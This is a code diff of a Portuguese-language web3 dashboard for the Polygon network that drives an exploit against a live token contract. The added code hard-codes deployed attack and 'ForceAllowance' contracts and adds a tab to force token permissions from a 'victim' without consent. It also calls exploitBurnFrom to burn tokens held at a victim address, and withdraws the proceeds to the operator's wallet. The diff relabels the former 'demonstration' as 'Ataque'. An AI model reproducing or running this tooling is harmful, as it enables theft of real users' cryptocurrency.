@@ -7,164 +7,35 @@
     <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bignumber.js@9.1.0/bignumber.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 15px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }
-        
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 10px;
-            padding: 15px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        
-        .warning h3 {
-            color: #856404;
-            margin-bottom: 10px;
-        }
-        
-        .section {
-            margin-bottom: 25px;
-            padding: 20px;
-            border: 2px solid #e9ecef;
-            border-radius: 10px;
-        }
-        
-        h1 {
-            text-align: center;
-            color: #333;
-            margin-bottom: 30px;
-            font-size: 2.2em;
-        }
-        
-        h2 {
-            color: #495057;
-            margin-bottom: 15px;
-            border-bottom: 2px solid #667eea;
-            padding-bottom: 5px;
-        }
-        
-        .input-group {
-            margin-bottom: 15px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #495057;
-        }
-        
-        input, button, select {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-        }
-        
-        input:focus, select:focus {
-            border-color: #667eea;
-            outline: none;
-        }
-        
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            cursor: pointer;
-            font-weight: bold;
-            transition: transform 0.2s;
-            margin-top: 10px;
-        }
-        
-        button:hover {
-            transform: translateY(-2px);
-        }
-        
-        button:disabled {
-            background: #6c757d;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .result {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 10px;
-            border-left: 4px solid #667eea;
-        }
-        
-        .status {
-            padding: 10px;
-            border-radius: 5px;
-            text-align: center;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
-        
-        .connected {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        
-        .disconnected {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        
-        .info-box {
-            background: #e7f3ff;
-            border: 1px solid #b3d9ff;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 15px;
-        }
-        
-        .quick-actions {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-top: 10px;
-        }
-        
-        .quick-btn {
-            padding: 8px;
-            font-size: 14px;
-        }
-        
-        .balance-display {
-            background: #d1ecf1;
-            border: 1px solid #bee5eb;
-            border-radius: 5px;
-            padding: 10px;
-            margin-top: 5px;
-            text-align: center;
-            font-weight: bold;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
+        .container { max-width: 1000px; margin: 0 auto; background: white; border-radius: 15px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        .warning { background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 10px; padding: 15px; margin-bottom: 20px; text-align: center; }
+        .warning h3 { color: #856404; margin-bottom: 10px; }
+        .section { margin-bottom: 25px; padding: 20px; border: 2px solid #e9ecef; border-radius: 10px; }
+        h1 { text-align: center; color: #333; margin-bottom: 30px; font-size: 2.2em; }
+        h2 { color: #495057; margin-bottom: 15px; border-bottom: 2px solid #667eea; padding-bottom: 5px; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: #495057; }
+        input, button, select { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; margin-top: 5px; }
+        button { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; cursor: pointer; font-weight: bold; transition: transform 0.2s; }
+        button:hover { transform: translateY(-2px); }
+        button:disabled { background: #6c757d; cursor: not-allowed; transform: none; }
+        .result { background: #f8f9fa; padding: 15px; border-radius: 8px; margin-top: 10px; border-left: 4px solid #667eea; }
+        .status { padding: 10px; border-radius: 5px; text-align: center; font-weight: bold; margin-bottom: 15px; }
+        .connected { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .disconnected { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .info-box { background: #e7f3ff; border: 1px solid #b3d9ff; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
+        .quick-actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        .quick-btn { padding: 8px; font-size: 14px; }
+        .balance-display { background: #d1ecf1; border: 1px solid #bee5eb; border-radius: 5px; padding: 10px; margin-top: 5px; text-align: center; font-weight: bold; }
+        .tab-container { margin-bottom: 20px; }
+        .tab-buttons { display: flex; margin-bottom: 10px; }
+        .tab-btn { flex: 1; padding: 10px; background: #f8f9fa; border: 1px solid #ddd; cursor: pointer; }
+        .tab-btn.active { background: #667eea; color: white; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .contract-address { font-family: monospace; background: #f8f9fa; padding: 5px; border-radius: 3px; }
     </style>
 </head>
 <body>
@@ -180,13 +51,13 @@
 
         <div class="section">
             <h2>🔗 Conexão com a Rede</h2>
-            <div id="connectionStatus" class="status disconnected">
-                Desconectado da Rede Polygon
-            </div>
+            <div id="connectionStatus" class="status disconnected">Desconectado da Rede Polygon</div>
             <button onclick="connectWallet()">Conectar Carteira</button>
+            
             <div class="info-box">
-                <strong>Endereço do Contrato Vulnerável:</strong><br>
-                0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01
+                <strong>Token Vulnerável:</strong> <span class="contract-address">0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01</span><br>
+                <strong>Contrato Ataque:</strong> <span class="contract-address">0x6Bb0326db6ad090c35bc4B41500d9e1C1f185406</span><br>
+                <strong>Contrato ForceAllowance:</strong> <span class="contract-address">0xc91B994F393A584Deb786E0647F3fE2d4EF8F596</span>
             </div>
             
             <div class="input-group">
@@ -195,87 +66,113 @@
             </div>
         </div>
 
-        <div class="section">
-            <h2>📊 Verificações de Segurança</h2>
-            
-            <div class="input-group">
-                <label>Endereço para Verificar Saldo LGNS:</label>
-                <input type="text" id="balanceAddress" placeholder="0x...">
-                <button onclick="checkBalance()">Verificar Saldo LGNS</button>
-                <div id="balanceResult" class="result"></div>
+        <div class="tab-container">
+            <div class="tab-buttons">
+                <button class="tab-btn active" onclick="openTab('tab1')">🔍 Verificações</button>
+                <button class="tab-btn" onclick="openTab('tab2')">🛠️ Forçar Permissão</button>
+                <button class="tab-btn" onclick="openTab('tab3')">🎯 Ataque Direto</button>
             </div>
-            
-            <div class="input-group">
-                <label>Verificar Permissões (Allowance):</label>
-                <input type="text" id="ownerAddress" placeholder="Dono dos tokens (0x...)">
-                <input type="text" id="spenderAddress" placeholder="Quem tem permissão (0x...)" style="margin-top: 10px;">
-                <button onclick="checkAllowance()">Verificar Permissão</button>
-                <div id="allowanceResult" class="result"></div>
-            </div>
-        </div>
 
-        <div class="section">
-            <h2>🎯 Demonstração da Vulnerabilidade</h2>
-            <div class="info-box">
-                <strong>Vulnerabilidade:</strong> Função _burnFrom pública<br>
-                <strong>Risco:</strong> Permite queimar tokens de outros endereços
-            </div>
-            
-            <div class="input-group">
-                <label>Endereço do Contrato Vítima:</label>
-                <input type="text" id="victimAddress" placeholder="0x... (contrato com LGNS)">
-            </div>
-            
-            <div class="input-group">
-                <label>Quantidade de LGNS para Demonstrar:</label>
-                <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 10px;">
-                    <input type="number" id="attackAmount" placeholder="Ex: 100" step="0.1" min="0.1">
-                    <select id="amountUnit">
-                        <option value="lgns">LGNS</option>
-                        <option value="wei">Wei</option>
-                    </select>
-                </div>
-                
-                <div class="quick-actions">
-                    <button class="quick-btn" onclick="setAmount(1)">1 LGNS</button>
-                    <button class="quick-btn" onclick="setAmount(10)">10 LGNS</button>
-                    <button class="quick-btn" onclick="setAmount(100)">100 LGNS</button>
-                    <button class="quick-btn" onclick="setAmount(1000)">1000 LGNS</button>
+            <!-- ABA 1: Verificações -->
+            <div id="tab1" class="tab-content active">
+                <div class="section">
+                    <h2>📊 Verificações de Segurança</h2>
+                    
+                    <div class="input-group">
+                        <label>Endereço para Verificar Saldo LGNS:</label>
+                        <input type="text" id="balanceAddress" placeholder="0x...">
+                        <button onclick="checkBalance()">Verificar Saldo LGNS</button>
+                        <div id="balanceResult" class="result"></div>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Verificar Permissões (Allowance):</label>
+                        <input type="text" id="ownerAddress" placeholder="Dono dos tokens (0x...)">
+                        <input type="text" id="spenderAddress" placeholder="Quem tem permissão (0x...)" value="0x6Bb0326db6ad090c35bc4B41500d9e1C1f185406">
+                        <button onclick="checkAllowance()">Verificar Permissão</button>
+                        <div id="allowanceResult" class="result"></div>
+                    </div>
                 </div>
             </div>
-            
-            <button onclick="executeDemo()" id="demoButton">Executar Demonstração</button>
-            <div id="demoResult" class="result"></div>
+
+            <!-- ABA 2: Forçar Permissão -->
+            <div id="tab2" class="tab-content">
+                <div class="section">
+                    <h2>🛠️ Forçar Permissão</h2>
+                    <div class="info-box">
+                        <strong>Contrato ForceAllowance:</strong> <span class="contract-address">0xc91B994F393A584Deb786E0647F3fE2d4EF8F596</span><br>
+                        Use quando a vítima não deu permissão naturalmente
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Forçar Permissão para:</label>
+                        <input type="text" id="forceVictim" placeholder="Vítima (0x...)">
+                        <input type="text" id="forceSpender" placeholder="Quem recebe permissão (0x...)" value="0x6Bb0326db6ad090c35bc4B41500d9e1C1f185406">
+                        <input type="number" id="forceAmount" placeholder="Quantidade em LGNS" step="0.1" min="0.1" value="1">
+                        
+                        <button onclick="forceAllowance()" id="forceBtn">Forçar Permissão</button>
+                        <div id="forceResult" class="result"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ABA 3: Ataque Direto -->
+            <div id="tab3" class="tab-content">
+                <div class="section">
+                    <h2>🎯 Ataque Direto</h2>
+                    
+                    <div class="input-group">
+                        <label>Endereço do Contrato Vítima:</label>
+                        <input type="text" id="victimAddress" placeholder="0x... (contrato com LGNS)">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Quantidade de LGNS:</label>
+                        <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 10px;">
+                            <input type="number" id="attackAmount" placeholder="Ex: 100" step="0.1" min="0.1" value="1">
+                            <select id="amountUnit">
+                                <option value="lgns">LGNS</option>
+                                <option value="wei">Wei</option>
+                            </select>
+                        </div>
+                        
+                        <div class="quick-actions">
+                            <button class="quick-btn" onclick="setAmount(1)">1 LGNS</button>
+                            <button class="quick-btn" onclick="setAmount(10)">10 LGNS</button>
+                            <button class="quick-btn" onclick="setAmount(100)">100 LGNS</button>
+                            <button class="quick-btn" onclick="setAmount(1000)">1000 LGNS</button>
+                        </div>
+                    </div>
+                    
+                    <button onclick="executeDemo()" id="demoButton">Executar Ataque</button>
+                    <div id="demoResult" class="result"></div>
+                </div>
+
+                <div class="section">
+                    <h2>💰 Gerenciamento de Fundos</h2>
+                    
+                    <div class="input-group">
+                        <label>Seu Saldo de LGNS no Contrato:</label>
+                        <div id="contractBalance" class="balance-display">-</div>
+                        <button onclick="checkContractBalance()">Atualizar Saldo</button>
+                    </div>
+                    
+                    <div class="quick-actions">
+                        <button onclick="withdrawTokens()" class="quick-btn">Retirar LGNS para Carteira</button>
+                        <button onclick="withdrawFunds()" class="quick-btn">Retirar MATIC</button>
+                    </div>
+                </div>
+            </div>
         </div>
 
         <div class="section">
-            <h2>💰 Gerenciamento de Fundos</h2>
-            
-            <div class="input-group">
-                <label>Seu Saldo de LGNS no Contrato de Ataque:</label>
-                <div id="contractBalance" class="balance-display">-</div>
-                <button onclick="checkContractBalance()">Atualizar Saldo</button>
-            </div>
-            
-            <div class="quick-actions">
-                <button onclick="withdrawTokens()" class="quick-btn">Retirar LGNS para Minha Carteira</button>
-                <button onclick="withdrawFunds()" class="quick-btn">Retirar MATIC</button>
-            </div>
-        </div>
-
-        <div class="section">
-            <h2>📝 Contrato de Ataque</h2>
+            <h2>📝 Status dos Contratos</h2>
             <div id="contractInfo" class="result">
-                Aguardando implantação do contrato...
+                <strong>Contrato Ataque:</strong> Não conectado<br>
+                <strong>Contrato Force:</strong> Não conectado
             </div>
             
-            <div class="input-group">
-                <label>Endereço do Seu Contrato (se já implantado):</label>
-                <input type="text" id="contractAddress" placeholder="0x... (cole aqui se já tiver contrato)">
-                <button onclick="connectExistingContract()">Conectar ao Contrato Existente</button>
-            </div>
-            
-            <button onclick="deployContract()" id="deployButton">Implantar Novo Contrato Demo</button>
+            <button onclick="connectAllContracts()" id="connectAllBtn">Conectar Todos os Contratos</button>
         </div>
     </div>
 
@@ -283,9 +180,11 @@
         let web3;
         let userAccount;
         let attackContract;
-        let attackContractAddress;
+        let forceContract;
+        let attackContractAddress = "0x6Bb0326db6ad090c35bc4B41500d9e1C1f185406";
+        let forceContractAddress = "0xc91B994F393A584Deb786E0647F3fE2d4EF8F596";
 
-        // ABI do Contrato de Ataque (mesmo do anterior)
+        // ABI COMPLETO do Contrato de Ataque
         const ATTACK_ABI = [
             {
                 "inputs": [],
@@ -463,7 +362,171 @@
             }
         ];
 
-        // ABI simplificada do Token Vulnerável
+        // ABI COMPLETO do Contrato ForceAllowance
+        const FORCE_ABI = [
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "token",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "victim",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "spender",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "AllowanceCreated",
+                "type": "event"
+            },
+            {
+                "anonymous": false,
+                "inputs": [
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "token",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "from",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": true,
+                        "internalType": "address",
+                        "name": "to",
+                        "type": "address"
+                    },
+                    {
+                        "indexed": false,
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "TransferForced",
+                "type": "event"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "token",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "victim",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "spender",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "forceAllowance",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "token",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "from",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "to",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "forceTransfer",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "token",
+                        "type": "address"
+                    }
+                ],
+                "name": "withdrawTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "withdrawMATIC",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "stateMutability": "payable",
+                "type": "receive"
+            }
+        ];
+
+        // ABI do Token LGNS
         const TOKEN_ABI = [
             {
                 "constant": false,
@@ -501,21 +564,50 @@
                 "name": "approve",
                 "outputs": [{"name": "", "type": "bool"}],
                 "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "sender", "type": "address"},
+                    {"name": "recipient", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "transferFrom",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "recipient", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "transfer",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
             }
         ];
 
         const VULNERABLE_TOKEN = "0xeB51D9A39AD5EEF215dC0Bf39a8821ff804A0F01";
 
-        // Funções para facilitar o uso
+        // Funções de navegação
+        function openTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.getElementById(tabName).classList.add('active');
+            event.currentTarget.classList.add('active');
+        }
+
         function setAmount(amount) {
             document.getElementById('attackAmount').value = amount;
+            document.getElementById('forceAmount').value = amount;
         }
 
         function convertToWei(amount, unit) {
             if (unit === 'wei') {
                 return amount;
             }
-            // LGNS tem 9 decimais (conforme o contrato)
+            // LGNS tem 9 decimais
             return new BigNumber(amount).times(1e9).toString();
         }
 
@@ -535,15 +627,8 @@
                     document.getElementById('connectionStatus').innerHTML = 
                         `Conectado: ${userAccount.substring(0, 6)}...${userAccount.substring(38)}`;
                     
-                    // Atualizar saldo de MATIC
                     await updateMaticBalance();
-                    
-                    // Verificar se já tem contrato salvo
-                    const savedContract = localStorage.getItem('attackContractAddress');
-                    if (savedContract) {
-                        document.getElementById('contractAddress').value = savedContract;
-                        await connectExistingContract();
-                    }
+                    await connectAllContracts();
                     
                 } else {
                     alert('Por favor, instale o MetaMask!');
@@ -551,6 +636,45 @@
             } catch (error) {
                 console.error('Erro ao conectar:', error);
                 alert('Erro ao conectar carteira: ' + error.message);
+            }
+        }
+
+        async function connectAllContracts() {
+            if (!web3 || !userAccount) return;
+            
+            try {
+                document.getElementById('connectAllBtn').disabled = true;
+                document.getElementById('connectAllBtn').innerText = 'Conectando...';
+
+                // Conectar contrato de ataque
+                attackContract = new web3.eth.Contract(ATTACK_ABI, attackContractAddress);
+                
+                // Conectar contrato force
+                forceContract = new web3.eth.Contract(FORCE_ABI, forceContractAddress);
+                
+                // Verificar ownership
+                const attackOwner = await attackContract.methods.owner().call();
+                const forceOwner = await forceContract.methods.owner().call();
+                
+                let info = `<strong>Contrato Ataque:</strong> ${attackContractAddress}<br>`;
+                info += `<strong>Dono:</strong> ${attackOwner} ${attackOwner.toLowerCase() === userAccount.toLowerCase() ? '✅' : '❌'}<br><br>`;
+                info += `<strong>Contrato Force:</strong> ${forceContractAddress}<br>`;
+                info += `<strong>Dono:</strong> ${forceOwner} ${forceOwner.toLowerCase() === userAccount.toLowerCase() ? '✅' : '❌'}`;
+                
+                document.getElementById('contractInfo').innerHTML = info;
+                
+                if (attackOwner.toLowerCase() !== userAccount.toLowerCase() || forceOwner.toLowerCase() !== userAccount.toLowerCase()) {
+                    alert('AVISO: Você não é o dono de um ou mais contratos!');
+                }
+                
+                await checkContractBalance();
+                document.getElementById('connectAllBtn').innerText = 'Todos Conectados!';
+                
+            } catch (error) {
+                console.error('Erro ao conectar contratos:', error);
+                alert('Erro ao conectar contratos: ' + error.message);
+                document.getElementById('connectAllBtn').disabled = false;
+                document.getElementById('connectAllBtn').innerText = 'Conectar Todos os Contratos';
             }
         }
 
@@ -563,97 +687,6 @@
                 document.getElementById('maticBalance').innerHTML = `${parseFloat(maticBalance).toFixed(4)} MATIC`;
             } catch (error) {
                 console.error('Erro ao buscar saldo:', error);
-            }
-        }
-
-        async function connectExistingContract() {
-            const contractAddress = document.getElementById('contractAddress').value;
-            
-            if (!web3 || !userAccount) {
-                alert('Conecte sua carteira primeiro!');
-                return;
-            }
-
-            if (!contractAddress) {
-                alert('Digite o endereço do contrato!');
-                return;
-            }
-
-            try {
-                attackContractAddress = contractAddress;
-                attackContract = new web3.eth.Contract(ATTACK_ABI, attackContractAddress);
-                
-                // Verificar se é dono do contrato
-                const owner = await attackContract.methods.owner().call();
-                if (owner.toLowerCase() !== userAccount.toLowerCase()) {
-                    alert('AVISO: Você não é o dono deste contrato!');
-                }
-                
-                document.getElementById('contractInfo').innerHTML = 
-                    `<strong>Contrato Conectado:</strong><br>${attackContractAddress}<br>
-                     <strong>Dono:</strong> ${owner}`;
-                
-                // Salvar no localStorage
-                localStorage.setItem('attackContractAddress', contractAddress);
-                
-                // Atualizar saldo do contrato
-                await checkContractBalance();
-                
-            } catch (error) {
-                console.error('Erro ao conectar contrato:', error);
-                alert('Erro ao conectar contrato: ' + error.message);
-            }
-        }
-
-        async function deployContract() {
-            if (!web3 || !userAccount) {
-                alert('Conecte sua carteira primeiro!');
-                return;
-            }
-
-            try {
-                document.getElementById('deployButton').disabled = true;
-                document.getElementById('deployButton').innerText = 'Implantando...';
-
-                // Nota: Você precisa compilar o contrato e colocar o bytecode aqui
-                const contractBytecode = 'SEU_BYTECODE_AQUI'; // Substituir pelo bytecode real
-                
-                if (contractBytecode === 'SEU_BYTECODE_AQUI') {
-                    alert('Por favor, compile o contrato e insira o bytecode no código!');
-                    return;
-                }
-
-                const contract = new web3.eth.Contract(ATTACK_ABI);
-                
-                const deployTx = contract.deploy({
-                    data: contractBytecode
-                });
-
-                const gasEstimate = await deployTx.estimateGas({ from: userAccount });
-                
-                const deployedContract = await deployTx.send({
-                    from: userAccount,
-                    gas: gasEstimate
-                });
-
-                attackContractAddress = deployedContract.options.address;
-                attackContract = new web3.eth.Contract(ATTACK_ABI, attackContractAddress);
-                
-                document.getElementById('contractInfo').innerHTML = 
-                    `<strong>Contrato Implantado:</strong><br>${attackContractAddress}`;
-                
-                document.getElementById('contractAddress').value = attackContractAddress;
-                localStorage.setItem('attackContractAddress', attackContractAddress);
-                
-                document.getElementById('deployButton').innerText = 'Contrato Implantado!';
-                
-                await checkContractBalance();
-                
-            } catch (error) {
-                console.error('Erro na implantação:', error);
-                alert('Erro ao implantar contrato: ' + error.message);
-                document.getElementById('deployButton').disabled = false;
-                document.getElementById('deployButton').innerText = 'Implantar Contrato Demo';
             }
         }
 
@@ -679,7 +712,7 @@
                      <small>(${balance} wei)</small>`;
             } catch (error) {
                 console.error('Erro:', error);
-                document.getElementById('balanceResult').innerHTML = 'Erro ao verificar saldo';
+                document.getElementById('balanceResult').innerHTML = 'Erro ao verificar saldo: ' + error.message;
             }
         }
 
@@ -707,13 +740,12 @@
                      <small>(${allowance} wei)</small>`;
             } catch (error) {
                 console.error('Erro:', error);
-                document.getElementById('allowanceResult').innerHTML = 'Erro ao verificar permissão';
+                document.getElementById('allowanceResult').innerHTML = 'Erro ao verificar permissão: ' + error.message;
             }
         }
 
         async function checkContractBalance() {
             if (!web3 || !attackContract) {
-                alert('Conecte ao contrato primeiro!');
                 return;
             }
 
@@ -729,9 +761,50 @@
             }
         }
 
+        async function forceAllowance() {
+            if (!web3 || !userAccount || !forceContract) {
+                alert('Conecte carteira primeiro!');
+                return;
+            }
+
+            const victim = document.getElementById('forceVictim').value;
+            const spender = document.getElementById('forceSpender').value;
+            const amount = document.getElementById('forceAmount').value;
+            
+            if (!victim || !spender || !amount) {
+                alert('Preencha todos os campos!');
+                return;
+            }
+
+            try {
+                document.getElementById('forceBtn').disabled = true;
+                document.getElementById('forceBtn').innerText = 'Forçando...';
+
+                const amountInWei = convertToWei(amount, 'lgns');
+                
+                await forceContract.methods.forceAllowance(VULNERABLE_TOKEN, victim, spender, amountInWei)
+                    .send({ from: userAccount });
+                
+                document.getElementById('forceResult').innerHTML = 
+                    '✅ Permissão forçada com sucesso!<br>' +
+                    `Vítima: ${victim}<br>` +
+                    `Permitido para: ${spender}<br>` +
+                    `Quantidade: ${amount} LGNS<br>
+                     <small>Agora você pode executar o ataque na aba "Ataque Direto"</small>`;
+                
+            } catch (error) {
+                console.error('Erro ao forçar permissão:', error);
+                document.getElementById('forceResult').innerHTML = 
+                    '❌ Erro ao forçar permissão: ' + error.message;
+            } finally {
+                document.getElementById('forceBtn').disabled = false;
+                document.getElementById('forceBtn').innerText = 'Forçar Permissão';
+            }
+        }
+
         async function executeDemo() {
             if (!web3 || !userAccount || !attackContract) {
-                alert('Conecte carteira e contrato primeiro!');
+                alert('Conecte carteira primeiro!');
                 return;
             }
 
@@ -750,32 +823,30 @@
 
                 const amountInWei = convertToWei(amount, unit);
                 
-                // Executa a demonstração do ataque
                 await attackContract.methods.exploitBurnFrom(victimAddress, amountInWei)
                     .send({ from: userAccount });
                 
                 document.getElementById('demoResult').innerHTML = 
-                    '✅ Demonstração executada com sucesso!<br>' +
+                    '✅ Ataque executado com sucesso!<br>' +
                     `Vítima: ${victimAddress}<br>` +
                     `Quantidade: ${parseFloat(amount).toLocaleString('pt-BR')} LGNS<br>
-                     <small>Transação confirmada - Tokens queimados do contrato vítima</small>`;
+                     <small>Tokens queimados do contrato vítima</small>`;
                 
-                // Atualizar saldo do contrato
                 await checkContractBalance();
                 
             } catch (error) {
-                console.error('Erro na demonstração:', error);
+                console.error('Erro no ataque:', error);
                 document.getElementById('demoResult').innerHTML = 
-                    '❌ Erro na demonstração: ' + error.message;
+                    '❌ Erro no ataque: ' + error.message;
             } finally {
                 document.getElementById('demoButton').disabled = false;
-                document.getElementById('demoButton').innerText = 'Executar Demonstração';
+                document.getElementById('demoButton').innerText = 'Executar Ataque';
             }
         }
 
         async function withdrawTokens() {
             if (!web3 || !userAccount || !attackContract) {
-                alert('Conecte carteira e contrato primeiro!');
+                alert('Conecte carteira primeiro!');
                 return;
             }
 
@@ -783,6 +854,7 @@
                 await attackContract.methods.withdrawTokens().send({ from: userAccount });
                 alert('✅ LGNS retirados para sua carteira!');
                 await checkContractBalance();
+                await updateMaticBalance();
             } catch (error) {
                 console.error('Erro ao retirar tokens:', error);
                 alert('Erro ao retirar tokens: ' + error.message);
@@ -791,7 +863,7 @@
 
         async function withdrawFunds() {
             if (!web3 || !userAccount || !attackContract) {
-                alert('Conecte carteira e contrato primeiro!');
+                alert('Conecte carteira primeiro!');
                 return;
             }
 
@@ -809,6 +881,19 @@
         window.addEventListener('load', async () => {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
+                // Tentar conectar automaticamente se já tiver permissão
+                try {
+                    const accounts = await web3.eth.getAccounts();
+                    if (accounts.length > 0) {
+                        userAccount = accounts[0];
+                        document.getElementById('connectionStatus').className = 'status connected';
+                        document.getElementById('connectionStatus').innerHTML = 
+                            `Conectado: ${userAccount.substring(0, 6)}...${userAccount.substring(38)}`;
+                        await updateMaticBalance();
+                    }
+                } catch (error) {
+                    console.log('Não conectado automaticamente');
+                }
             }
         });
     </script>
